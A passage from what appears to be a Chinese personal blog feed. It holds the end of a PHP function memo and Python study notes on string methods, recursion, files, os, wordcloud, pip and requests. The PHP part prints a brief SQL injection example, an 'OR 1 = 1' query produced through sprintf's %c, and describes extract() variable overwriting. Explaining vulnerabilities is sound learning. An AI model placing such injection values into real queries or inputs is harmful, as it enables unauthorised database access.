;</code></pre><p><code>%c</code>起到了类似<code>chr()</code>的效果，将数字39转化为<code>&#39;</code>，从而导致了sql注入。</p><pre class="language-sql" data-language="sql"><code class="language-sql">SELECT * FROM foo WHERE bar IN (&#39;&#39;) OR 1 &#x3D; 1 &#x2F;*) AND baz &#x3D; 39</code></pre><h3 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h3><p><code>extract()</code> 函数从数组中将变量导入到当前的符号表。<a href="https://www.php.net/manual/zh/function.extract.php">参考</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E4%B8%80%E4%BA%9BPHP%E5%87%BD%E6%95%B0/image-20200515140833843.png" alt loading="lazy"></p><p>如果未设置<strong><code>EXTR_SKIP</code></strong>，则会导致变量覆盖，<a href="https://crayon-xin.github.io/2018/05/21/extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">参考</a></p><p>注：覆盖的是原来已经设置的或没设置的值，如果在函数后面又重新设置了这个值，则会再覆盖回去，可以参考本博客的<strong>反序列化-安洵杯-2019-easy_serialize_php</strong></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python笔记</title>
      <link href="/posts/c00b24b1/"/>
      <url>/posts/c00b24b1/</url>
      
        <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="运算函数"><a href="#运算函数" class="headerlink" title="运算函数"></a>运算函数</h2><table><thead><tr><th align="center">函数</th><th align="center">作用</th><th align="center">例</th></tr></thead><tbody><tr><td align="center">abs(x)</td><td align="center">绝对值函数</td><td align="center">abs(-1) = 1</td></tr><tr><td align="center">divmod(x,y)</td><td align="center">商余函数</td><td align="center">divmod(10,3) = (3,1)</td></tr><tr><td align="center">pow(x,y,z)</td><td align="center">幂运算函数</td><td align="center">pow(2,2) = 4,pow(2,2,3) = 1</td></tr><tr><td align="center">round(x)</td><td align="center">四舍五入函数</td><td align="center">round(1.5) = 2</td></tr><tr><td align="center">max(x)</td><td align="center">最大值函数</td><td align="center">max(1,2,3) = 3</td></tr><tr><td align="center">min(x)</td><td align="center">最小值函数</td><td align="center">min(1,2,3) = 1</td></tr></tbody></table><h2 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h2><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">len(x)</td><td align="center">返回字符串x的长度，len(“壹1,\‘ a”) = 6</td></tr><tr><td align="center">str(x)</td><td align="center">任意类型x所对应的字符串形式,str(‘abc123’)=abc123,与eval()形成对比</td></tr><tr><td align="center">hex(x)或oct(x)</td><td align="center">整数x的十六进制或八进制小写形式的字符串，hex(111)=’0x6f’,oct(111)=’0o157’</td></tr><tr><td align="center">chr(x)</td><td align="center">x为Unicode编码，返回其对应的字符，chr(20197) = ‘以’</td></tr><tr><td align="center">ord(x)</td><td align="center">x为字符，返回其对应的Unicode编码，ord(“以”) = 20197</td></tr></tbody></table><blockquote><p><strong>输入为小数字符串，转换成int型方法：<code>a = int(float(a))</code></strong></p></blockquote><pre class="language-python" data-language="python"><code class="language-python">for i in range(12):    print(chr(9800 + i),end&#x3D;&#39;&#39;)</code></pre><p>♈♉♊♋♌♍♎♏♐♑♒♓</p><h2 id="字符串处理方法"><a href="#字符串处理方法" class="headerlink" title="字符串处理方法"></a>字符串处理方法</h2><table><thead><tr><th align="center">方法及使用</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">str.lower()或str.upper()</td><td align="center">返回字符串的副本，全部字符小写/大写 “AbCdEfGh”.lower()结果为“abcdefgh”</td></tr><tr><td align="center">str.split(sep=None)</td><td align="center">返回一个列表，由str根据sep被分隔的部分组成 “A,B,C”.split(“,”)结果为[‘A’,’B’,’C’]</td></tr><tr><td align="center">str.count(sub)</td><td align="center">返回子串sub在str中出现的次数  “a apple a day”.count(“a”)结果为4</td></tr><tr><td align="center">str.replace(old,new)</td><td align="center">返回字符串str副本，所有old子串被替换为new “python”.replace(“n”,”n123”)结果为‘python123’</td></tr><tr><td align="center">str.center(width[,fillchar])</td><td align="center">字符串str根据宽度width居中fillchar可选 “python”.center(20,”=”) 结果为‘=======python=======’</td></tr><tr><td align="center">str.strip(chars)</td><td align="center">从str中去掉在其左侧和右侧chars中列出的字符 “= python=”.strip(“ =np”)结果为 ‘ytho’</td></tr><tr><td align="center">str.join(iter)</td><td align="center">在iter变量除最后元素外每个元素后增加一个 str”,”.join(“12345”)结果为’1,2,3,4,5’ 主要用于字符串分隔等</td></tr><tr><td align="center">str.isdigit()</td><td align="center">判断接收的字符是否为数字，返回True或False，无参数</td></tr></tbody></table><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>即程序报错执行except的语句</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200204172105285.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200204172853121.png" style="zoom:67%;" loading="lazy"><p>异常类型详见：<a href="https://www.runoob.com/python/python-exceptions.html">Python 异常处理</a></p><h2 id="随机数函数"><a href="#随机数函数" class="headerlink" title="随机数函数"></a>随机数函数</h2><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">randint(a,b)</td><td align="center">生成一个[a,b]之间的整数&gt;&gt;&gt;random.randint(10,100)=64</td></tr><tr><td align="center">randrange(m,n[,k])</td><td align="center">生成一个[m,n)之间以k为步长的随机整数&gt;&gt;&gt;random.randrange(10,100,10)=80</td></tr><tr><td align="center">getrandbits(k)</td><td align="center">生成一个k比特长的随机整数&gt;&gt;&gt;random.getrandbits(16)=37885</td></tr><tr><td align="center">uniform(a,b)</td><td align="center">生成一个[a,b]之间的随机小数&gt;&gt;&gt;random.uniform(10,100)=13.234563456</td></tr><tr><td align="center">choice(seq)</td><td align="center">从序列seq中随机选择一个元素&gt;&gt;&gt;random.choice([1,2,3,4,5,6,7,8,9,0])=5</td></tr><tr><td align="center">shuffle(seq)</td><td align="center">将序列seq中元素随机排序，返回打乱后的序列                             &gt;&gt;&gt;s=[1,2,3,4];random.shuffle(s);print(s)   [3,1,4,2]</td></tr></tbody></table><blockquote><p>global：在函数内部声明全局变量</p></blockquote><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>阶乘：</p><pre class="language-python" data-language="python"><code class="language-python">def a(x):    if x &#x3D;&#x3D; 1: return 1    return (x * a(x-1))</code></pre><p>求和</p><pre class="language-python" data-language="python"><code class="language-python">def a(x):    if x &#x3D;&#x3D; 1: return 1    return (x + a(x-1))</code></pre><p>汉诺塔问题求解</p><pre class="language-python" data-language="python"><code class="language-python">count &#x3D; 0def hanoi(n,src,dst,mid):    global count    if n &#x3D;&#x3D; 1:        print(&quot;&#123;&#125;:&#123;&#125;-&gt;&#123;&#125;&quot;.format(1,src,dst))        count +&#x3D; 1    else:        hanoi(n-1,src,mid,dst)        print(&quot;&#123;&#125;:&#123;&#125;-&gt;&#123;&#125;&quot;.format(n,src,dst))        count +&#x3D; 1        hanoi(n-1,mid,dst,src)hanoi(5,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;)print(count)</code></pre><p>科赫曲线雪花绘制</p><pre class="language-python" data-language="python"><code class="language-python">import turtledef koch(size,n):    if n &#x3D;&#x3D; 0:        turtle.fd(size)    else:        for angle in [0,60,-120,60]:            turtle.left(angle)            koch(size&#x2F;3,n-1)def main():    turtle.setup(1200,800)    turtle.penup()    turtle.goto(-300,100)    turtle.pendown()    turtle.pensize(2)    for i in range(3):        koch(300,3)  #2阶科赫曲线，阶数        turtle.right(120)    turtle.hideturtle()    turtle.done()main()</code></pre><h2 id="集合处理方法"><a href="#集合处理方法" class="headerlink" title="集合处理方法"></a>集合处理方法</h2><table><thead><tr><th align="center">操作函数或方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">S.add(x)</td><td align="center">如果x不在集合S中，将x增加到S</td></tr><tr><td align="center">S.discard(x)</td><td align="center">移除S中元素x，如果不在集合S中，不报错</td></tr><tr><td align="center">S.remove()</td><td align="center">移除S中元素x，如果x不在集合S中，产生KeyError异常</td></tr><tr><td align="center">S.clear()</td><td align="center">移除S中的所有元素</td></tr><tr><td align="center">S.pop()</td><td align="center">随机<strong>返回</strong>S中的一个元素，<strong>更新</strong>S，若S为空产生KeyError异常</td></tr><tr><td align="center">S.copy()</td><td align="center">返回集合S中的一个副本</td></tr><tr><td align="center">len(S)</td><td align="center">返回集合S的元素个数</td></tr><tr><td align="center">x in S</td><td align="center">判断S中元素x，x在集合S中，返回True，否则返回False</td></tr><tr><td align="center">x not in S</td><td align="center">判断S中元素x，x不在集合S中，返回False，否则返回True</td></tr><tr><td align="center"><code>set(x)</code></td><td align="center">将其他类型变量x转变为<code>集合</code>类型，可用以集合元素去重</td></tr><tr><td align="center"><code>list(x)</code></td><td align="center">转换为<code>列表</code>类型</td></tr><tr><td align="center"><code>tuple(x)</code></td><td align="center">转换为<code>元组</code>类型</td></tr></tbody></table><h2 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200205173145060.png" style="zoom:67%;" loading="lazy"><table><thead><tr><th align="center">函数和方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">len(s)</td><td align="center">返回序列s的长度</td></tr><tr><td align="center">min(s)</td><td align="center">返回序列s的最小元素，s中元素需要可比较</td></tr><tr><td align="center">max(s)</td><td align="center">返回序列s的最大元素，s中元素需要可比较</td></tr><tr><td align="center">s.index(x)或s.index(x,i,j)</td><td align="center">返回序列s从i开始到j位置中第一次出现元素x的位置</td></tr><tr><td align="center">s.count(x)</td><td align="center">返回序列s中出现x的总次数</td></tr></tbody></table><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200205175031008.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200205175315482.png" style="zoom:67%;" loading="lazy"><blockquote><p>sorted()：对列表进行排序（小到大）</p></blockquote><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>使用<code>&#123;&#125;</code>和<code>dict&#123;&#125;</code>给变量赋值创建，键值对之间用<code>:</code>分隔，d[key]可以进行索引也可用于赋值，但在进行赋值的时候只能啊<code>a[1] = a[2]</code>这样赋值，不能<code>1 = a[1]</code>、a[i]代表的是i这个键对应的值，无法直接修改值的键，如果要对键操作需要将这个键删除（即<code>(del a[i])</code>），然后再将这个值赋给一个新的键。</p><p><code>update()</code>方法，在字典中添加键值对，也可以直接赋值添加</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200216101507795.png" alt loading="lazy"></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200205184557293.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200205184654602.png" style="zoom:67%;" loading="lazy"><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200207164533879.png" style="zoom:67%;" loading="lazy"><p>文件读取方法：<code>read()</code>,<code>readline()</code>,<code>readlines()</code>,在入方法：<code>write()</code>,<code>writelines()</code></p><p>二维数据的处理：<code>for</code>循环+<code>.split()</code>和<code>.join()</code></p><p>三国演义人物出场词频统计</p><pre class="language-python" data-language="python"><code class="language-python">import jiebatxt &#x3D; open(&quot;三国演义.txt&quot;,&quot;r&quot;,encoding&#x3D;&quot;utf-8&quot;).read()words &#x3D; jieba.lcut(txt)  #lcut精确模式，返回一列表类型counts &#x3D; &#123;&#125;for word in words:    if len(word) &#x3D;&#x3D; 1:        continue    else:        counts[word] &#x3D; counts.get(word,0) + 1    #字典类型中&#39;&#x3D;&#39;为创造一个键值对，亦可进行赋值操作items &#x3D; list(counts.items()) #items方法为返回字典中所有的键值对信息items.sort(key &#x3D; lambda x:x[1],reverse&#x3D;True)for i in range(20):    word,count &#x3D; items[i]    print(&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;.format(word,count))</code></pre><h2 id="yield"><a href="#yield" class="headerlink" title="yield"></a>yield</h2><p>生成器<a href="https://blog.csdn.net/mieleizhi0522/article/details/82142856/">参考</a></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193657638.png" style="zoom:67%;" loading="lazy"><h2 id="is"><a href="#is" class="headerlink" title="is"></a>is</h2><p>在Pytohn中，进行数值比较时会用到 <code>==</code> 运算符，判断两个变量的地址是否相同用 <code>is</code> 关键字</p><p>如下列比较操作</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200406163737563.png" alt loading="lazy"></p><h2 id="pass"><a href="#pass" class="headerlink" title="pass"></a>pass</h2><p>Python pass 是空语句，是为了保持程序结构的完整性。</p><p><strong>pass</strong> 不做任何事情，一般用做占位语句。</p><pre class="language-python" data-language="python"><code class="language-python">def sample(n_samples):    pass</code></pre><p>该处的 pass 便是占据一个位置，因为如果定义一个空函数程序会报错，当你没有想好函数的内容是可以用 pass 填充，使程序可以正常运行。</p><h2 id="u-r-b-f"><a href="#u-r-b-f" class="headerlink" title="u,r,b,f"></a>u,r,b,f</h2><p>在字符串前面为了能够更好的识别字符串处理方式，于是在字符串前面加上这些标识符来识别</p><ul><li>u：后面字符串以 Unicode 格式 进行编码，一般用在中文字符串前面，防止因为源码储存格式问题，导致再次使用时出现乱码。</li><li>r：去掉反斜杠的转义机制。常用于re模块</li><li>b：后面字符串是bytes 类型。在网络编程中，服务器和浏览器只认bytes 类型数据。</li><li>f：字符串内支持大括号内的python 表达式</li></ul><h2 id="和"><a href="#和" class="headerlink" title="*和**"></a><code>*</code>和<code>**</code></h2><p>这两种用法可以将<strong>任意个数</strong>的参数导入到python函数中</p><p>单星号<code>（*）</code>：<code>*agrs</code> 将所有参数以<strong>元组(tuple)</strong>的形式导入，如下：</p><pre class="language-python" data-language="python"><code class="language-python">def a(str1,*str2):    print(str1)    print(str2)def b(str1,str2):    print(str1)    print(str2)k &#x3D; [1,2]a(1,2,3,4,5,6,7)b(*k)   #解压参数列表</code></pre><p>输出：</p><pre class="language-python" data-language="python"><code class="language-python">1(2, 3, 4, 5, 6, 7)12</code></pre><p>双星号<code>（**）</code>：<code>**kwargs</code> 将参数以<strong>字典</strong>的形式导入，如下：</p><pre class="language-python" data-language="python"><code class="language-python">def a(str1,**str2):    print(str1)    print(str2)a(1,a&#x3D;2,b&#x3D;3)</code></pre><p>输出：</p><pre class="language-python" data-language="python"><code class="language-python">1&#123;&#39;a&#39;: 2, &#39;b&#39;: 3&#125;</code></pre><h1 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>评估函数</p><p>用法：去掉参数最外侧引号并执行余下语句的函数</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200201103455433.png" alt loading="lazy"></p><h2 id="format"><a href="#format" class="headerlink" title="format()"></a>format()</h2><p>格式化函数</p><p>基本语法是通过{}和:来代替以前的%，<a href="https://www.runoob.com/python/att-string-format.html">详</a></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200202141611146.png" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200202171711002.png" style="zoom: 40%;" loading="lazy"><h2 id="id"><a href="#id" class="headerlink" title="id()"></a>id()</h2><p><strong>id()</strong> 函数返回对象的唯一标识符，标识符是一个整数。</p><p>CPython 中 <strong>id()</strong> 函数用于获取对象的内存地址。</p><p>语法：<code>id([object])</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200406162510638.png" alt loading="lazy"></p><h2 id="type"><a href="#type" class="headerlink" title="type()"></a>type()</h2><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200215100705983.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200406163544027.png" alt loading="lazy"></p><h2 id="isinstance"><a href="#isinstance" class="headerlink" title="isinstance()"></a>isinstance()</h2><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200215145928773.png" alt loading="lazy"></p><h2 id="open"><a href="#open" class="headerlink" title="open()"></a>open()</h2><p><a href="https://www.runoob.com/python/file-methods.html">参考</a></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200216104144396.png" style="zoom:80%;" loading="lazy"><h2 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h2><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200415104107118.png" alt loading="lazy"></p><h2 id="send"><a href="#send" class="headerlink" title="send()"></a>send()</h2><p><a href="https://www.jianshu.com/p/6c33bd958f3d">参考</a></p><p>mode 参数有：</p><table><thead><tr><th align="center">模式</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">t</td><td align="center">文本模式 (默认)。</td></tr><tr><td align="center">x</td><td align="center">写模式，新建一个文件，如果该文件已存在则会报错。</td></tr><tr><td align="center">b</td><td align="center">二进制模式。</td></tr><tr><td align="center">+</td><td align="center">打开一个文件进行更新(可读可写)。</td></tr><tr><td align="center">U</td><td align="center">通用换行模式（不推荐）。</td></tr><tr><td align="center">r</td><td align="center">以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td></tr><tr><td align="center">rb</td><td align="center">以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。</td></tr><tr><td align="center">r+</td><td align="center">打开一个文件用于读写。文件指针将会放在文件的开头。</td></tr><tr><td align="center">rb+</td><td align="center">以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。</td></tr><tr><td align="center">w</td><td align="center">打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td></tr><tr><td align="center">wb</td><td align="center">以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td></tr><tr><td align="center">w+</td><td align="center">打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td></tr><tr><td align="center">wb+</td><td align="center">以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td></tr><tr><td align="center">a</td><td align="center">打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td align="center">ab</td><td align="center">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td align="center">a+</td><td align="center">打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td></tr><tr><td align="center">ab+</td><td align="center">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td></tr></tbody></table><p>默认为文本模式，如果要以二进制模式打开，加上 <code>b</code> 。</p><p>file 对象使用 open 函数来创建，下表列出了 file 对象常用的函数：</p><table><thead><tr><th align="center">序号</th><th align="center">方法及描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><a href="https://www.runoob.com/python/file-close.html"><code>file.close()</code></a>关闭文件。关闭后文件不能再进行读写操作。</td></tr><tr><td align="center">2</td><td align="center"><a href="https://www.runoob.com/python/file-flush.html"><code>file.flush()</code></a>刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件, 而不是被动的等待输出缓冲区写入。</td></tr><tr><td align="center">3</td><td align="center"><a href="https://www.runoob.com/python/file-fileno.html"><code>file.fileno()</code></a>返回一个整型的文件描述符(file descriptor FD 整型), 可以用在如os模块的read方法等一些底层操作上。</td></tr><tr><td align="center">4</td><td align="center"><a href="https://www.runoob.com/python/file-isatty.html"><code>file.isatty()</code></a>如果文件连接到一个终端设备返回 True，否则返回 False。</td></tr><tr><td align="center">5</td><td align="center"><a href="https://www.runoob.com/python/file-next.html"><code>file.next()</code></a>返回文件下一行。</td></tr><tr><td align="center">6</td><td align="center"><a href="https://www.runoob.com/python/python-file-read.html"><code>file.read([size])</code></a>从文件读取指定的字节数，如果未给定或为负则读取所有。</td></tr><tr><td align="center">7</td><td align="center"><a href="https://www.runoob.com/python/file-readline.html"><code>file.readline([size])</code></a>读取整行，包括 “\n” 字符。</td></tr><tr><td align="center">8</td><td align="center"><a href="https://www.runoob.com/python/file-readlines.html"><code>file.readlines([sizeint])</code></a>读取所有行并返回列表，若给定sizeint&gt;0，则是设置一次读多少字节，这是为了减轻读取压力。</td></tr><tr><td align="center">9</td><td align="center"><a href="https://www.runoob.com/python/file-seek.html"><code>file.seek(offset[, whence])</code></a>设置文件当前位置</td></tr><tr><td align="center">10</td><td align="center"><a href="https://www.runoob.com/python/file-tell.html"><code>file.tell()</code></a>返回文件当前位置。</td></tr><tr><td align="center">11</td><td align="center"><a href="https://www.runoob.com/python/file-truncate.html"><code>file.truncate([size])</code></a>截取文件，截取的字节通过size指定，默认为当前文件位置。</td></tr><tr><td align="center">12</td><td align="center"><a href="https://www.runoob.com/python/python-file-write.html"><code>file.write(str)</code></a>将字符串写入文件，返回的是写入的字符长度。</td></tr><tr><td align="center">13</td><td align="center"><a href="https://www.runoob.com/python/file-writelines.html"><code>file.writelines(sequence)</code></a>向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。</td></tr></tbody></table><h1 id="一些库"><a href="#一些库" class="headerlink" title="一些库"></a>一些库</h1><h2 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h2><h3 id="OS库路径操作"><a href="#OS库路径操作" class="headerlink" title="OS库路径操作"></a>OS库路径操作</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200210121104519.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200210121210427.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200210121239874.png" style="zoom:67%;" loading="lazy"><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200210121259753.png" style="zoom:67%;" loading="lazy"><p>os.path.getsize(path)：返回path对应文件的大小，以字节为单位&gt;&gt;&gt;os.path.getsize(“c:/1.txt”)   ——&gt;   123</p><h3 id="OS库进程管理"><a href="#OS库进程管理" class="headerlink" title="OS库进程管理"></a>OS库进程管理</h3><p>os.system(command)———–执行程序或命令command，在Windows中返回值为cmd的调用返回信息</p><h3 id="OS库环境参数"><a href="#OS库环境参数" class="headerlink" title="OS库环境参数"></a>OS库环境参数</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200210122033256.png" style="zoom:67%;" loading="lazy"><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">os.getlogin()</td><td align="center">获得当前系统登录用户名称</td></tr><tr><td align="center">os.cpu_count()</td><td align="center">获得当前系统的CPU数量</td></tr></tbody></table><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200210133215349.png" style="zoom:67%;" loading="lazy"><h2 id="wordcloud"><a href="#wordcloud" class="headerlink" title="wordcloud"></a>wordcloud</h2><p>配置对象参数—&gt;加载词云文本—&gt;输出词云文件</p><blockquote><p>分隔：以空格分隔单词</p><p>统计：单词出现次数并过滤</p><p>字体：根据统计配置字号</p><p>布局：颜色环境尺寸</p></blockquote><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">w.generate(txt)</td><td align="center">向WordCloud对象w中加载文本txt &gt;&gt;&gt;<code>w.generate(&quot;Python and WordCloud&quot;)</code></td></tr><tr><td align="center">w.to_file(filename)</td><td align="center">将词云输出为图像文件，<code>.png</code>或<code>.jpg</code>格式 &gt;&gt;&gt;<code>w.to_file(&quot;outfile.png&quot;)</code></td></tr></tbody></table><p>w.wordcloud.WordCloud()参数：</p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">min_font_size</td><td align="center">指定词云中字体的最小字体，默认4 &gt;&gt;&gt;w=wordcloud.WordCloud(min_font_size=10)</td></tr><tr><td align="center">max_font_size</td><td align="center">指定词云中字体的最大字号，根据高度自动调节  &gt;&gt;&gt;w=wordcloud.WordCloud(max_font_size=20)</td></tr><tr><td align="center">font_step</td><td align="center">指定词云中字体字号的步进间隔，默认为1 &gt;&gt;&gt;w=wordcloud.WordCloud(font_step=2)</td></tr><tr><td align="center">width</td><td align="center">指定词云对象生成图片的宽度，默认400像素 &gt;&gt;&gt; w= wordcloud.WordCloud(width=600)</td></tr><tr><td align="center">height</td><td align="center">指定词云对象生成图片的高度，默认200像素 &gt;&gt;&gt;w= wordcloud.WordCloud(width=400)</td></tr><tr><td align="center">font_path</td><td align="center">指定字体文件的路径，默认None &gt;&gt;&gt; w=wordcloud.WordCloud(font_path=”msyh.ttc”)</td></tr><tr><td align="center">max-words</td><td align="center">指定词云显示的最大单词数量，默认200 &gt;&gt;&gt; w= wordcloud.WordCloud(max_words=20)</td></tr><tr><td align="center">stop_word</td><td align="center">指定词云的排除列表，即不显示单词列表&gt;&gt;&gt; w= wordcloud.WordCloud(stop_words={“Python”})</td></tr><tr><td align="center">mask</td><td align="center">指定词云形状，默认为长方形，需要引用imread()函数&gt;&gt;&gt;from scipy.misc import imread &gt;&gt;&gt; mk = imread(“pic.png”) &gt;&gt;&gt; w = wordcloud.WordCloud(mask=mk)</td></tr><tr><td align="center">background_color</td><td align="center">指定词云图片的背景颜色，默认为红黑色 &gt;&gt;&gt; w= wordcloud.WordCloud(background_color=”white”)</td></tr></tbody></table><h2 id="PyInstaller"><a href="#PyInstaller" class="headerlink" title="PyInstaller"></a>PyInstaller</h2><p>打包.py文件为.exe应用程序</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200205161232599.png" style="zoom:67%;" loading="lazy"><h2 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h2><table><thead><tr><th align="center">使用方法</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">pip install &lt;第三方库名&gt;</td><td align="center">安装第三方库</td></tr><tr><td align="center">pip install -U &lt;第三方库名&gt;</td><td align="center">更新第三方库</td></tr><tr><td align="center">pip uninstall &lt;第三方库名&gt;</td><td align="center">卸载第三方库</td></tr><tr><td align="center">pip download &lt;第三方库名&gt;</td><td align="center">下载但不安装指定的第三方库</td></tr><tr><td align="center">pip show &lt;第三方库名&gt;</td><td align="center">列出某个指定第三方库的详细信息</td></tr><tr><td align="center">pip search &lt;关键字&gt;</td><td align="center">根据关键词在名称和介绍中搜索第三方库</td></tr><tr><td align="center">pip list</td><td align="center">列出当前系统的python版本已经安装的第三方库</td></tr></tbody></table><h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><h3 id="主要方法"><a href="#主要方法" class="headerlink" title="主要方法"></a>主要方法</h3><table><thead><tr><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">requests.requset(method,url,**kwargs)</td><td align="center">构造一个请求，支撑以下各方法的基础方法</td></tr><tr><td align="center">requests.get(url,params=None,**kwargs)</td><td align="center">获取HTML网页的主要方法，对应于HTTP的GET</td></tr><tr><td align="center">requests.head(url,**kwargs)</td><td align="center">获取HTML网页头信息的方法，对应于HTTP的HEAD</td></tr><tr><td align="center">requests.post(url,data=None,json=None,**kwargs)</td><td align="center">向HTML网页提交POST请求的方法，对应于HTTP的POST</td></tr><tr><td align="center">requests.put(url,data=None,**kwargs)</td><td align="center">向HTML网页提交PUT请求的方法，对应于HTTP的PUT</td></tr><tr><td align="center">requests.patch(url,data=None,**kwargs)</td><td align="center">向HTML网页提交局部修改请求，对应于HTTP的PATCH</td></tr><tr><td align="center">requests.delete(url,**kwargs)</td><td align="center">向HTML页面提交删除请求，对应于HTTP的DELETE</td></tr></tbody></table><p>method：</p><blockquote><p>请求方式，GET,HEAD,POST,PUT,PATCH,DALETE,OPTIONS</p></blockquote><p>**kwargs：</p><p>控制访问的参数，均为可选项</p><blockquote><p>params：字典或字节序列，作为参数增加到url中</p><p>data：字典、字节序列或文件对象，作为Request的内容</p><p>json：JSON格式的数据，作为Request的内容</p><p>headers：字典，HTTP定制头</p><p>cookies：字典或CookieJar，Request中的cookie</p><p>auth：元祖，支持HTTP认证功能</p><p>files：字典类型，传输文件</p><p>timeout：设定超时时间，秒为单位</p><p>proxies：字典类型，设定访问代理服务器，可以增加登录认证</p><p>allow_redirects：True/False，默认为True，重定向开关</p><p>stream：True/False，默认为True，获取内容立即下载开关</p><p>verify：True/False，默认为True，认证SSL证书开关</p><p>cert：本地SSL证书路径</p></blockquote><h3 id="Requests库的异常"><a href="#Requests库的异常" 